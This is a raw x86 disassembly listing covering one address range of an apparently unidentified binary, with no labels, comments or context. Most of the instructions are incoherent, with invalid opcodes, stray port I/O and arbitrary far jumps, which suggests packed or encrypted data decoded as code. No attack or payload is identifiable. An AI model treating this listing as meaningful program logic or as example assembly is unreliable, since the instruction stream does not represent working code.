  42167c:	shl    eax,0xea
  42167f:	sub    al,0x5d
  421681:	mov    ebp,0x60cf62f7
  421686:	cmp    BYTE PTR [edx],cl
  421688:	fisttp QWORD PTR [ebp+0x40]
  42168b:	pop    eax
  42168c:	std    
  42168d:	(bad)  
  42168e:	cwde   
  42168f:	adc    DWORD PTR [esp+ebx*1+0x4d],edx
  421693:	xchg   esi,eax
  421694:	mov    al,0x50
  421696:	mov    ebp,0x3d1187c4
  42169b:	in     al,0x71
  42169d:	gs mov ebp,0xbb5a1e56
  4216a3:	(bad)  
  4216a4:	jbe    0x4216a4
  4216a6:	retf   0x6dd2
  4216a9:	and    ebp,DWORD PTR [bx+di]
  4216ac:	or     al,0x1f
  4216ae:	or     ebp,DWORD PTR ds:0xdf9b04cd
  4216b4:	xor    ch,BYTE PTR [ebp+ecx*8-0x36]
  4216b8:	cmp    eax,0xda8d5c71
  4216bd:	cwde   
  4216be:	in     eax,dx
  4216bf:	fldenv [eax+edi*8+0x44]
  4216c3:	add    BYTE PTR [ebx],cl
  4216c5:	push   ecx
  4216c6:	ss in  al,dx
  4216c8:	pop    esp
  4216c9:	shl    bl,0x48
  4216cc:	repz adc BYTE PTR [esi+ecx*4],dh
  4216d0:	pop    esi
  4216d1:	imul   ebx,DWORD PTR [edx+0x552d1fe6],0xdef83c93
  4216db:	mov    edx,0xfbcc0d66
  4216e0:	nop
  4216e1:	mov    bl,BYTE PTR [edi-0x1f]
  4216e4:	sbb    eax,0x16e3a9eb
  4216e9:	mov    esi,edx
  4216eb:	mov    dh,0xb4
  4216ed:	adc    eax,DWORD PTR [eax]
	...
  421753:	add    BYTE PTR [eax],al
  421755:	add    BYTE PTR [ebx-0x105512d4],ch
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	stc    
  421763:	stos   BYTE PTR es:[edi],al
  421764:	or     DWORD PTR [ebp+0x16767],0x0
  42176b:	add    DWORD PTR [eax],eax
  42176d:	add    BYTE PTR [ecx+0x79147468],bh
  421773:	fisub  DWORD PTR [ebx-0x4b83d583]
  421779:	dec    edi
  42177a:	pop    es
  42177b:	cdq    
  42177c:	mov    ebx,0xd3561808
  421781:	push   edx
  421782:	lahf   
  421783:	adc    DWORD PTR [esp+0x66],edx
  421787:	xchg   esp,eax
  421788:	and    edx,DWORD PTR ds:0x182850e9
  42178e:	fidivr DWORD PTR [edi-0x6e]
  421791:	cmc    
  421792:	pop    edi
  421793:	(bad)  
  421794:	sti    
  421795:	xchg   edx,eax
  421796:	aam    0x4c
  421798:	in     al,0xa
  42179a:	and    eax,0x8543065c
  42179f:	pop    esp
  4217a0:	add    bh,BYTE PTR [eax-0x6962f2e6]
  4217a6:	in     eax,dx
  4217a7:	neg    DWORD PTR [ebx]
  4217a9:	jno    0x4217b3
  4217ab:	outs   dx,DWORD PTR ds:[esi]
  4217ac:	fidivr WORD PTR [ecx+0x76cd3344]
  4217b2:	xchg   ecx,eax
  4217b3:	iret   
  4217b4:	inc    edx
  4217b5:	pop    ss
  4217b6:	stos   BYTE PTR es:[edi],al
  4217b7:	xchg   edi,eax
  4217b8:	call   0xb16e7be8
  4217bd:	loope  0x42182f
  4217bf:	test   al,0xb5
  4217c1:	call   0x74125ecc
  4217c6:	aas    
  4217c7:	loop   0x4217d8
  4217c9:	lods   al,BYTE PTR ds:[esi]
  4217ca:	inc    edx
  4217cb:	dec    edx
  4217cc:	jns    0x421833
  4217ce:	push   ds
  4217cf:	and    eax,0x3912b18
  4217d4:	jg     0x4217f6
  4217d6:	in     eax,dx
  4217d7:	cli    
  4217d8:	and    al,BYTE PTR [edi+0x7963ef40]
  4217de:	or     eax,0x8b1dc6db
  4217e3:	mov    ebx,esp
  4217e5:	adc    eax,0xb007732f
  4217ea:	fcomp  DWORD PTR [esi]
  4217ec:	call   0xfea35e07
  4217f1:	mov    al,0xf6
  4217f3:	div    ecx
  4217f5:	push   es
  4217f6:	sub    eax,0xa810d3ec
  4217fb:	mov    ch,0x27
  4217fd:	xor    BYTE PTR [esi+0xae6087],bl
  421803:	cmp    DWORD PTR [ebx],0xeee0c8e2
  421809:	mov    cl,0xab
  42180b:	repnz icebp 
  42180d:	mov    ch,0x3a
  42180f:	cld    
  421810:	push   esi
  421811:	shl    DWORD PTR [edi+0x29],0xe9
  421815:	cmp    DWORD PTR [esi-0x4b5765f0],ecx
  42181b:	jmp    0x42186f
  42181d:	stos   DWORD PTR es:[edi],eax
  42181e:	pop    ebp
  42181f:	popf   
  421820:	push   ebp
  421821:	mov    es:0x1927cb23,al
  421827:	push   esi
  421828:	in     eax,dx
  421829:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42182b:	popf   
  42182c:	outs   dx,DWORD PTR ds:[esi]
  42182d:	test   BYTE PTR [edi-0x1f64425],cl
  421833:	push   0xd57a823c
  421838:	loope  0x4218b5
  42183a:	mov    BYTE PTR [ebx+eiz*1-0x68],cl
  42183e:	sbb    al,0x88
  421840:	cmp    edi,DWORD PTR [edi-0x61]
  421843:	and    al,0x9e
  421845:	lock and eax,0xde184432
  42184b:	in     eax,0x18
  42184d:	push   ss
  42184e:	mov    dl,0x38
  421850:	cli    
  421851:	xor    esp,DWORD PTR [esi+edx*2-0x5b950113]
  421858:	scas   eax,DWORD PTR es:[edi]
  421859:	xchg   ecx,eax
  42185a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42185b:	sub    al,0x9f
  42185d:	xor    esi,DWORD PTR [ebp+0x5f95f5ec]
  421863:	or     al,0x3
  421865:	mov    ebp,0x1deeaf9e
  42186a:	dec    edi
  42186b:	mov    dl,0xe0
  42186d:	and    eax,DWORD PTR [eax]
	...
  4218d3:	add    BYTE PTR [eax],al
  4218d5:	add    cl,dl
  4218d7:	mov    al,ds:0xf9f9e0b9
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	mov    ecx,0x6704af00
  4218e7:	push   0x1000001
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	jle    0x421889
  4218f0:	mov    al,ds:0x32a60f98
  4218f5:	xlat   BYTE PTR ds:[ebx]
  4218f6:	outs   dx,BYTE PTR ds:[esi]
  4218f7:	rcl    ah,cl
  4218f9:	(bad)  
  4218fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218fb:	rep outs dx,DWORD PTR ds:[esi]
  4218fd:	mov    al,0x5e
  4218ff:	retf   0xa8c6
  421902:	cmp    eax,0x5aec4d54
  421907:	fwait
  421908:	push   ds
  421909:	dec    esi
  42190a:	aaa    
  42190b:	pop    eax
  42190c:	pop    esp
  42190d:	pusha  
  42190e:	xor    esi,DWORD PTR [esp]
  421911:	cmp    edx,DWORD PTR [edi]
  421913:	bound  ecx,QWORD PTR [esi]
  421915:	ss pop esp
  421917:	push   ebx
  421918:	jecxz  0x4218fd
  42191a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42191b:	mov    ch,0x91
  42191d:	push   ebx
  42191e:	nop
  42191f:	dec    ebx
  421920:	out    dx,eax
  421921:	cwde   
  421922:	mov    edi,0x4dc921fb
  421927:	bound  edx,QWORD PTR [ecx-0x26]
  42192a:	add    dl,BYTE PTR es:[bx+di-0x10]
  42192f:	inc    eax
  421930:	push   ss
  421931:	cmc    
  421932:	pop    ds
  421933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421934:	cld    
  421935:	inc    ebx
  421936:	sub    BYTE PTR [ecx-0x18bf3f21],0x62
  42193d:	or     ecx,ecx
  42193f:	call   0xe18639e0
  421944:	inc    edx
  421945:	mov    DWORD PTR [edx+0xf0e9bbd],0x4199e9bf
  42194f:	mov    ch,0x6a
  421951:	mov    ch,0x42
  421953:	sub    DWORD PTR [ecx-0x18],0xebe3a559
  42195a:	sub    cl,cl
  42195c:	jg     0x421913
  42195e:	adc    BYTE PTR [edi],cl
  421960:	xor    DWORD PTR [esp+edi*8+0x1a2bbd7f],0x3d
  421968:	push   edi
  421969:	mov    al,ds:0xf68acfc6
  42196e:	jnp    0x421954
  421970:	add    al,0x74
  421972:	push   esi
  421973:	cmp    eax,0x38e646bb
  421978:	sahf   
  421979:	or     eax,0xdf00f901
  42197e:	pop    ss
  42197f:	ins    BYTE PTR es:[edi],dx
  421980:	fwait
  421981:	test   DWORD PTR [esi],0xd50ee40a
  421987:	mov    edi,esp
  421989:	cmp    BYTE PTR [eax-0x40],bl
  42198c:	sbb    DWORD PTR [ecx+0x1c],edx
  42198f:	pusha  
  421990:	mov    al,0x1e
  421992:	outs   dx,DWORD PTR ds:[esi]
  421993:	xchg   DWORD PTR es:[eax],edx
  421996:	jecxz  0x421a15
  421998:	pusha  
  421999:	mov    edx,0xc6444ab1
  42199e:	addr16 pop ebx
  4219a0:	inc    ebx
  4219a1:	nop
  4219a2:	loope  0x42192f
  4219a4:	call   0xcf0f1c0d
  4219a9:	xchg   esp,eax
  4219aa:	das    
  4219ab:	add    al,0x7
  4219ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219b0:	sbb    DWORD PTR [edx-0x74],0xfffffff5
  4219b4:	dec    ebp
  4219b5:	mov    ecx,0x44f1e897
  4219ba:	std    
  4219bb:	xchg   esp,eax
  4219bc:	or     dl,BYTE PTR [eax-0x1a]
  4219bf:	jb     0x4219ed
  4219c1:	das    
  4219c2:	xchg   esi,eax
  4219c3:	and    eax,0x7edb74ff
  4219c8:	inc    edx
  4219c9:	fistp  WORD PTR es:[esi+edi*2+0x4d]
  4219ce:	jl     0x421a3c
  4219d0:	(bad)  
  4219d1:	fmul   QWORD PTR [ebx+0x1bd9c817]
  4219d7:	dec    edx
  4219d8:	mov    edx,0xb8f341ef
  4219dd:	enter  0x8b35,0x95
  4219e1:	xlat   BYTE PTR ds:[ebx]
  4219e2:	sbb    edx,edx
  4219e4:	push   es
  4219e5:	rcr    DWORD PTR [edx-0x18],0xed
  4219e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219ea:	fbstp  TBYTE PTR [ebx+0x98c8]
	...
  421a54:	add    BYTE PTR [eax],al
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	mov    al,0x79
  421a64:	lods   al,BYTE PTR ds:[esi]
  421a65:	jg     0x421ace
  421a67:	imul   eax,DWORD PTR [ecx],0x10000
  421a6d:	add    BYTE PTR [edx-0x39b7a8dc],bh
  421a73:	xchg   ebp,eax
  421a74:	dec    ecx
  421a75:	in     eax,dx
  421a76:	sar    DWORD PTR [esi+0x56c537e6],1
  421a7c:	gs inc cx
  421a7f:	mov    ah,BYTE PTR [ecx-0x2bd3087f]
  421a85:	and    ch,BYTE PTR [edx]
  421a87:	mov    dl,0x2f
  421a89:	inc    edx
  421a8a:	jle    0x421a30
  421a8c:	mov    al,ds:0xc5767b8f
  421a91:	ins    DWORD PTR es:[edi],dx
  421a92:	adc    eax,0x73888659
  421a97:	mov    gs,ebx
  421a99:	add    ecx,eax
  421a9b:	xor    BYTE PTR [eax+ecx*1],cl
  421a9e:	jmp    0x7cf3:0x7fce97b
  421aa5:	fidiv  WORD PTR [ebx-0x1d7ddf59]
  421aab:	repnz adc DWORD PTR [edi+edi*2],edi
  421aaf:	inc    ecx
  421ab0:	fldenv [edx]
  421ab2:	and    dh,BYTE PTR [ecx+edi*8-0x32d00232]
  421ab9:	mov    ch,0x64
  421abb:	call   0x7bc7:0x7298cd78
  421ac2:	es xchg esp,eax
  421ac4:	test   al,0xa6
  421ac6:	shr    DWORD PTR [eax],cl
  421ac8:	push   ecx
  421ac9:	(bad)  
  421aca:	(bad)  
  421acb:	sbb    eax,0x18864eb7
  421ad0:	xchg   esp,eax
  421ad1:	and    ch,cl
  421ad3:	add    ecx,eax
  421ad5:	or     DWORD PTR [ebp+0x4d],edi
  421ad8:	outs   dx,BYTE PTR ds:[esi]
  421ad9:	and    BYTE PTR [ebp-0x315b2a09],bl
  421adf:	sub    edx,ebx
  421ae1:	or     eax,0x4048c293
  421ae6:	ja     0x421b66
  421ae8:	iret   
  421ae9:	sbb    eax,0xec6c029
  421aee:	fstp   st(1)
  421af0:	xor    dl,BYTE PTR [edx+0x2e]
  421af3:	push   esi
  421af4:	cmp    dl,BYTE PTR [ebx-0x58]
  421af7:	inc    ecx
  421af8:	enter  0x84c0,0xe7
  421afc:	pop    esi
  421afd:	jns    0x421b0c
  421aff:	mov    ebx,0x39e8dad7
  421b04:	pop    ebx
  421b05:	fiadd  WORD PTR [eax]
  421b07:	inc    esi
  421b08:	fstp   st(1)
  421b0a:	inc    ebx
  421b0b:	inc    esp
  421b0c:	int    0xf6
  421b0e:	jmp    0x421b0c
  421b10:	jns    0x421b07
  421b12:	and    al,0xed
  421b14:	sahf   
  421b15:	fidivr DWORD PTR [ecx+0x18f2a199]
  421b1b:	dec    ecx
  421b1c:	mov    bh,BYTE PTR [esi+0x63]
  421b1f:	pop    ss
  421b20:	lods   al,BYTE PTR ds:[esi]
  421b21:	xor    DWORD PTR [ebp+0xa],edx
  421b24:	push   0x14
  421b26:	lock test DWORD PTR [ebx+esi*1-0x17a1291a],0xe48f1952
  421b32:	dec    ebp
  421b33:	bound  eax,QWORD PTR [esi-0x228186d0]
  421b39:	cmp    DWORD PTR ss:[eax],edi
  421b3c:	cmp    eax,0xb6f3ec57
  421b41:	or     DWORD PTR [esi+ebx*8],ebp
  421b44:	inc    esp
  421b45:	cmp    eax,0x89101df
  421b4a:	aas    
  421b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b4c:	les    ecx,FWORD PTR [eax+0x1eed468c]
  421b52:	test   DWORD PTR [edi+ecx*2-0x8932bc6],esi
  421b59:	and    BYTE PTR [edi+0x7426a113],al
  421b5f:	int    0x53
  421b61:	int    0xaf
  421b63:	ret    0x7f7f
  421b66:	adc    DWORD PTR [edi],esi
  421b68:	mov    esi,0x5ce0dc1
  421b6d:	bound  eax,QWORD PTR [eax]
	...
  421bd3:	add    BYTE PTR [eax],al
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     dl,BYTE PTR [ecx+ecx*8+0x6a67e811]
  421be8:	add    DWORD PTR [eax],eax
  421bea:	add    BYTE PTR [ecx],al
  421bec:	add    BYTE PTR [eax],al
  421bee:	in     al,0x1b
  421bf0:	(bad)  
  421bf1:	push   ebp
  421bf2:	fdiv   DWORD PTR [ecx]
  421bf4:	cmp    BYTE PTR ds:0xe1b197bd,dh
  421bfa:	cmp    DWORD PTR [esi],ecx
  421bfc:	add    esi,DWORD PTR [eax-0x13b77a8c]
  421c02:	mov    al,0xe7
  421c04:	je     0x421c02
  421c06:	sub    BYTE PTR [eax],ah
  421c08:	popa   
  421c09:	xchg   dh,dl
  421c0b:	pop    ebp
  421c0c:	inc    esi
  421c0d:	cwde   
  421c0e:	or     DWORD PTR [edi+0x5f079803],ebx
  421c14:	rcl    BYTE PTR [ebp+0x53],1
  421c17:	add    ah,BYTE PTR [edi-0x6b]
  421c1a:	test   al,0x9f
  421c1c:	mov    ?,ebx
  421c1e:	rcl    BYTE PTR [ebp+esi*2-0x699e437a],0x50
  421c26:	shr    dl,1
  421c28:	cmp    al,0x87
  421c2a:	out    dx,al
  421c2b:	inc    ebx
  421c2c:	pop    ebp
  421c2d:	and    esi,DWORD PTR [ebp+ebx*1-0x4]
  421c31:	jno    0x421c6a
  421c33:	das    
  421c34:	mov    WORD PTR [ebx+0x65],es
  421c37:	jb     0x421bfa
  421c39:	ins    DWORD PTR es:[edi],dx
  421c3a:	enter  0x1324,0xca
  421c3e:	in     eax,0x40
  421c40:	arpl   WORD PTR [edx+ebx*2+0x4c],bp
  421c44:	jl     0x421c35
  421c46:	push   0x620beb17
  421c4b:	pop    esi
  421c4c:	into   
  421c4d:	sbb    DWORD PTR [edi+0x1b],0x7c
  421c51:	mov    ebp,0x87b9fe08
  421c56:	fild   WORD PTR ds:[ebx]
  421c59:	inc    edx
  421c5a:	jge    0x421c02
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	lods   eax,DWORD PTR ds:[esi]
  421c5e:	cmc    
  421c5f:	outs   dx,DWORD PTR ds:[esi]
  421c60:	cdq    
  421c61:	pop    esp
  421c62:	xor    edi,edi
  421c64:	out    0xf9,eax
  421c66:	adc    DWORD PTR [eax-0x3f],ebp
  421c69:	lea    esi,[eax+0x67]
  421c6c:	pushf  
  421c6d:	fadd   DWORD PTR [edi+0x2b]
  421c70:	in     al,dx
  421c71:	cmp    ebp,DWORD PTR [ebp+0x7b]
  421c74:	xchg   ebx,eax
  421c75:	mov    ebx,0x4932aba4
  421c7a:	ja     0x421cdc
  421c7c:	sub    eax,0x2f34fdc2
  421c81:	jno    0x421c53
  421c83:	add    edi,DWORD PTR [eax]
  421c85:	nop
  421c86:	sar    DWORD PTR [edi+0x751b0413],1
  421c8c:	inc    BYTE PTR [edi+0x6bd6f56f]
  421c92:	shr    DWORD PTR [edi+0x3d],1
  421c95:	bound  edi,QWORD PTR [ecx]
  421c97:	xchg   BYTE PTR [ebx-0x10a586a1],dl
  421c9d:	ins    DWORD PTR es:[edi],dx
  421c9e:	lods   al,BYTE PTR ds:[esi]
  421c9f:	sub    bh,cl
  421ca1:	pop    eax
  421ca2:	xchg   bp,ax
  421ca4:	xor    dl,cl
  421ca6:	mov    dl,0xa8
  421ca8:	(bad)  
  421ca9:	sub    eax,0x5c6f2c53
  421cae:	ins    DWORD PTR es:[edi],dx
  421caf:	sbb    al,0x77
  421cb1:	sbb    eax,0x6e4008a1
  421cb6:	iret   
  421cb7:	xor    BYTE PTR [ebx+0x5a9aa01d],0x80
  421cbe:	cmp    eax,0xf13143df
  421cc3:	stos   BYTE PTR es:[edi],al
  421cc4:	sub    BYTE PTR [ebx],dh
  421cc6:	pushf  
  421cc7:	add    BYTE PTR [ecx],ah
  421cc9:	aaa    
  421cca:	lahf   
  421ccb:	gs out dx,eax
  421ccd:	test   DWORD PTR [edx-0x6ee0376e],esp
  421cd3:	pushf  
  421cd4:	hlt    
  421cd5:	mov    ebp,DWORD PTR [edi]
  421cd7:	ja     0x421cf7
  421cd9:	cmp    DWORD PTR [eax+ebx*4-0x59],eax
  421cdd:	pusha  
  421cde:	in     eax,dx
  421cdf:	ret    
  421ce0:	loopne 0x421cb5
  421ce2:	add    bh,bl
  421ce4:	arpl   WORD PTR [eax-0x6e],dx
  421ce7:	push   esi
  421ce8:	inc    ebx
  421ce9:	jecxz  0x421c8a
  421ceb:	scas   eax,DWORD PTR es:[edi]
  421cec:	mov    eax,ds:0xae
	...
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	outs   dx,BYTE PTR ds:[esi]
  421d63:	and    ebp,ebx
  421d65:	lock imul eax,DWORD PTR [bx+di],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d6f:	push   edx
  421d70:	fcomp  DWORD PTR [edi+0x23ba7c1e]
  421d76:	push   ecx
  421d77:	mov    WORD PTR [ebp+ebx*2+0x74631d00],es
  421d7e:	clc    
  421d7f:	inc    ecx
  421d80:	mov    edi,0xc4b00bea
  421d85:	mov    ecx,DWORD PTR [ebp-0x46]
  421d88:	hlt    
  421d89:	inc    ecx
  421d8a:	and    al,0xfc
  421d8c:	inc    ebx
  421d8d:	pushf  
  421d8e:	mov    ecx,0x8232abcf
  421d93:	push   ebx
  421d94:	dec    esi
  421d95:	in     al,0xe7
  421d97:	fadd   st,st(4)
  421d99:	cdq    
  421d9a:	dec    eax
  421d9b:	xchg   edx,eax
  421d9c:	add    BYTE PTR [ebp+0x71],0x13
  421da0:	adc    dh,dh
  421da2:	and    bl,dl
  421da4:	dec    esp
  421da5:	imul   ecx,DWORD PTR [edi],0xffffffe2
  421da8:	dec    esi
  421da9:	pop    edi
  421daa:	fisubr DWORD PTR [edx-0xc]
  421dad:	jg     0x421dfd
  421daf:	add    eax,0xe6dbb9a8
  421db4:	(bad)  
  421db5:	dec    esp
  421db6:	mov    WORD PTR ds:0x3db27a8a,ds
  421dbc:	mov    esi,0xbee4785a
  421dc1:	in     eax,dx
  421dc2:	pusha  
  421dc3:	enter  0x493,0x8a
  421dc7:	or     BYTE PTR [eax],dl
  421dc9:	sahf   
  421dca:	dec    ax
  421dcc:	sub    BYTE PTR [eax],ah
  421dce:	push   edi
  421dcf:	cwde   
  421dd0:	push   ss
  421dd1:	setne  bh
  421dd4:	push   0xf9d7f562
  421dd9:	lock dec ecx
  421ddb:	push   0x67
  421ddd:	jo     0x421e0c
  421ddf:	push   ebp
  421de0:	test   BYTE PTR [esi],ah
  421de2:	call   0x6b14e8cc
  421de7:	jb     0x421dac
  421de9:	mov    edx,DWORD PTR [ebp+0x11]
  421dec:	push   eax
  421ded:	daa    
  421dee:	inc    eax
  421def:	cmp    eax,0xe8ab641c
  421df4:	xor    eax,0xbb611350
  421df9:	imul   ecx,ebp,0x8d9288e7
  421dff:	xor    eax,0x73c9b200
  421e04:	mov    DWORD PTR [eax+0x9],ebx
  421e07:	adc    dh,BYTE PTR [ebp+0x611ab13a]
  421e0d:	pushf  
  421e0e:	lods   eax,DWORD PTR ds:[esi]
  421e0f:	sub    ch,bl
  421e11:	fldenv [ebp-0x47]
  421e14:	cmp    esi,DWORD PTR [ebx+ecx*8+0xcad308a]
  421e1b:	ds push 0xffffff86
  421e1e:	mov    bh,cl
  421e20:	inc    eax
  421e21:	test   al,0x80
  421e23:	mov    ecx,0xf4adc784
  421e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e29:	addr16 hlt 
  421e2b:	imul   esp,DWORD PTR [eax],0xffffffb7
  421e2e:	push   ss
  421e2f:	inc    edi
  421e30:	mov    esp,0xd19bc29d
  421e35:	mov    bh,0xe6
  421e37:	jecxz  0x421e5a
  421e39:	loope  0x421dbe
  421e3b:	jecxz  0x421e0f
  421e3d:	mov    ch,0xf
  421e3f:	mov    eax,0xb58eb7b4
  421e44:	dec    edi
  421e45:	xor    ecx,DWORD PTR [edx-0x78]
  421e48:	mov    BYTE PTR [ecx],bl
  421e4a:	fdiv   st,st(0)
  421e4c:	outs   dx,DWORD PTR ds:[esi]
  421e4d:	sti    
  421e4e:	add    al,0x4e
  421e50:	push   esp
  421e51:	or     al,0x14
  421e53:	jecxz  0x421ec1
  421e55:	jbe    0x421e66
  421e57:	call   0x22b1:0xebe8e77
  421e5e:	mov    WORD PTR [ecx+0x36],fs
  421e61:	jmp    0x2c1c:0xc0bbbbb8
  421e68:	iret   
  421e69:	sub    dh,ah
  421e6b:	push   ecx
  421e6c:	cld    
  421e6d:	aad    0x0
	...
  421ed3:	add    BYTE PTR [eax],al
  421ed5:	add    bh,cl
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	sbb    BYTE PTR [eax+0x6c67619a],dh
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	outs   dx,DWORD PTR ds:[esi]
  421eef:	pop    ebx
  421ef0:	jle    0x421f23
  421ef2:	jp     0x421eda
  421ef4:	data16 sbb al,0x72
  421ef7:	(bad)  
  421ef8:	stos   DWORD PTR es:[edi],eax
  421ef9:	aas    
  421efa:	pop    es
  421efb:	test   dh,bh
  421efd:	jp     0x421f5f
  421eff:	pop    esp
  421f00:	cmp    al,0x2
  421f02:	and    edi,DWORD PTR [ebx-0x6b]
  421f05:	xchg   ebx,eax
  421f06:	or     BYTE PTR [eax+0x7a],dh
  421f09:	dec    ebp
  421f0a:	push   esi
  421f0b:	xor    BYTE PTR [esi-0x5],al
  421f0e:	mov    ch,0x87
  421f10:	popa   
  421f11:	cmc    
  421f12:	sbb    eax,eax
  421f14:	js     0x421f36
  421f16:	mov    eax,0xc73128c6
  421f1b:	sbb    dl,BYTE PTR [edi]
  421f1d:	ins    BYTE PTR es:[edi],dx
  421f1e:	hlt    
  421f1f:	mov    WORD PTR [ecx+0x43],cs
  421f22:	add    cl,bl
  421f24:	scas   eax,DWORD PTR es:[edi]
  421f25:	sub    eax,0xeca28856
  421f2a:	in     eax,0x5c
  421f2c:	add    al,0x27
  421f2e:	ret    0x481d
  421f31:	pop    ebx
  421f32:	lahf   
  421f33:	push   edx
  421f34:	push   ss
  421f35:	push   edx
  421f36:	xchg   DWORD PTR [ecx+0x2df469f3],edi
  421f3c:	call   0xa9f9:0x7d86b4ea
  421f43:	mov    esi,0xff59dce6
  421f48:	ins    BYTE PTR es:[edi],dx
  421f49:	sar    ah,cl
  421f4b:	or     BYTE PTR [edx-0x446b8702],ah
  421f51:	das    
  421f52:	into   
  421f53:	cs mov edi,0x30b5597e
  421f59:	mov    bl,0x0
  421f5b:	les    ecx,FWORD PTR [esi+edi*4-0x13]
  421f5f:	jne    0x421eec
  421f61:	into   
  421f62:	xchg   ecx,eax
  421f63:	in     eax,dx
  421f64:	ja     0x421ef6
  421f66:	cmp    eax,0xa7caa7d3
  421f6b:	mov    bl,0x2b
  421f6d:	jmp    DWORD PTR [eax+0x8]
  421f70:	cmp    BYTE PTR [ebx+esi*2-0x11994c83],0xbc
  421f78:	out    dx,al
  421f79:	ds ss pop ds
  421f7c:	test   al,0x5b
  421f7e:	popa   
  421f7f:	mov    ecx,0x9654975a
  421f84:	es cwde 
  421f86:	repz jae 0x421fb0
  421f89:	cmc    
  421f8a:	aaa    
  421f8b:	jmp    0x421f5b
  421f8d:	pusha  
  421f8e:	jp     0x421f78
  421f90:	jmp    0xd9b1:0xe6b84d45
  421f97:	sbb    esp,DWORD PTR [ebp+0x1c27d924]
  421f9d:	stos   BYTE PTR es:[edi],al
  421f9e:	pop    ds
  421f9f:	aam    0x65
  421fa1:	mov    esi,0xd49f9211
  421fa6:	push   ecx
  421fa7:	add    al,0x15
  421fa9:	fcmovu st,st(6)
  421fab:	or     DWORD PTR [ebx],eax
  421fad:	fcom   st(1)
  421faf:	cmp    DWORD PTR [ebx],ebx
  421fb1:	mov    ah,BYTE PTR [edx+0x15]
  421fb4:	and    eax,0xef19d593
  421fb9:	popf   
  421fba:	ret    
  421fbb:	jmp    0x421f95
  421fbd:	sti    
  421fbe:	test   al,0xf7
  421fc0:	or     BYTE PTR [eax+0x66],ch
  421fc3:	xchg   esp,eax
  421fc4:	xor    al,0x35
  421fc6:	mov    ebp,0x3b37b874
  421fcb:	push   esp
  421fcc:	mov    eax,0x8e9d44d7
  421fd1:	inc    ecx
  421fd2:	add    eax,0x1453efb
  421fd7:	lock push edi
  421fd9:	ror    BYTE PTR [ecx+0x62ce3cb7],cl
  421fdf:	rol    BYTE PTR [edx],0x1d
  421fe2:	ret    0x542f
  421fe5:	jg     0x422061
  421fe7:	xor    ch,cl
  421fe9:	cmp    BYTE PTR [ecx+0x258711],al
	...
  422053:	add    BYTE PTR [eax],al
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	pushw  0x5c
  422064:	sbb    eax,0x16d67dd
  422069:	add    BYTE PTR [eax],al
  42206b:	add    DWORD PTR [eax],eax
  42206d:	add    al,dl
  42206f:	clc    
  422070:	mov    WORD PTR [edx-0x1],cs
  422073:	xor    dh,BYTE PTR [ecx+0x16]
  422076:	mov    ds:0x902cca89,al
  42207b:	or     eax,0x4f347719
  422080:	jne    0x422099
  422082:	jne    0x4220f2
  422084:	or     al,0x7f
  422086:	dec    edx
  422087:	in     eax,0xc5
  422089:	push   0x16
  42208b:	inc    ebx
  42208c:	ror    BYTE PTR [ebp-0xd5b98e2],0xae
  422093:	bound  ebx,QWORD PTR [eax+0x53]
  422096:	mov    dh,0xe6
  422098:	loope  0x422094
  42209a:	jmp    0x9e32:0x36e6d299
  4220a1:	and    eax,edx
  4220a3:	xchg   ecx,eax
  4220a4:	or     al,0x99
  4220a6:	jg     0x4220d3
  4220a8:	mov    bl,0xb9
  4220aa:	addr16 jp 0x42209c
  4220ad:	retf   
  4220ae:	daa    
  4220af:	cwde   
  4220b0:	call   esp
  4220b2:	ret    0x123f
  4220b5:	pop    ss
  4220b6:	dec    edx
  4220b7:	loope  0x4220e8
  4220b9:	shl    eax,0x26
  4220bc:	sbb    cl,al
  4220be:	out    dx,eax
  4220bf:	sbb    eax,0x3b07b366
  4220c4:	int    0x29
  4220c6:	mov    esi,edi
  4220c8:	cli    
  4220c9:	test   al,0xf2
  4220cb:	mov    cl,0x22
  4220cd:	or     al,0x7
  4220cf:	mov    esi,0xa641f9a1
  4220d4:	sub    al,0x7
  4220d6:	std    
  4220d7:	mov    al,ds:0x340b2474
  4220dc:	mov    al,0xc8
  4220de:	cld    
  4220df:	outs   dx,DWORD PTR ds:[esi]
  4220e0:	adc    BYTE PTR ds:0x85822398,cl
  4220e6:	daa    
  4220e7:	jmp    0x422145
  4220e9:	cli    
  4220ea:	pop    ecx
  4220eb:	and    esp,eax
  4220ed:	and    al,0x53
  4220ef:	aas    
